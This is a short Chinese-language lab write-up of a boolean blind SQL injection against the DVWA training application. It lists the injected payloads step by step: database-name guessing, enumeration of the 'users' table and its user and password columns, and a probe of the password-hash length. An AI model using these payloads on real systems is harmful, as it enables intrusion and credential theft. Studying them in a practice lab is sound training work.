DVWA-LOW-布尔盲注：
1:测试闭合
1' and 1=1-- 

2:测试库名长度
1' and length(database())=5 -- 
1' and length(database())=4 -- 
库名长度4为真

3:猜库名用Ascii码
1' and ascii(substr((select database()),1,1))>=100 --  真
1' and ascii(substr((select database()),1,1))>=110 --  假
1' and ascii(substr((select database()),1,1))=100 --  真    判断库名第一个字母为"d"
猜库名第二个字母
1' and ascii(substr((select database()),2,1))=118 --  根据真假判断第二个字母为"v"
猜库名第三个字母
1' and ascii(substr((select database()),3,1))=119 --  根据真假判断第三个字母为"w"
猜库名第四个字母
1' and ascii(substr((select database()),4,1))=97 --  根据真假判断第四个字母为"a"
得到库名为"dvwa"

猜表名
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),1,1))=117 --     得出第4行表名第一个字母为"u",前面几个表不是用户信息
猜表名第二个字母
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),2,1))=115 --     得出第4个表名第二个字母为"s"
猜表名第三个字母
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),3,1))=101 --     得出第4个表名第三个字母为"e"
猜表名第四个字母
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),4,1))=114 --     得出第4个表名第四个字母为"r"
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),5,1))=115 --     得出第4个表名第五个字母为"s"
limit 6,1为NULL，最终得出表名用户为"users"

猜列名
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1,1))=117 --    得出第4行列名第一个字母为"u"
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=115 --    得出第4行列名第二个字母为"s"
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),3,1))=101 --    得出第4行列名第三个字母为"e"
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=114 --    得出第4行列名第四个字母为"r"
得出第一重要列信息为"user"
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 4,1),1,1))=112 --    得出第5行列名第一个字母为"p"
依次得出第5行信息为"password"

猜密码
1' and length((select password from users limit 0,1))=32   因为是哈希MD5加密 手工太慢这里就开始尝试用SQLMAP验证了。
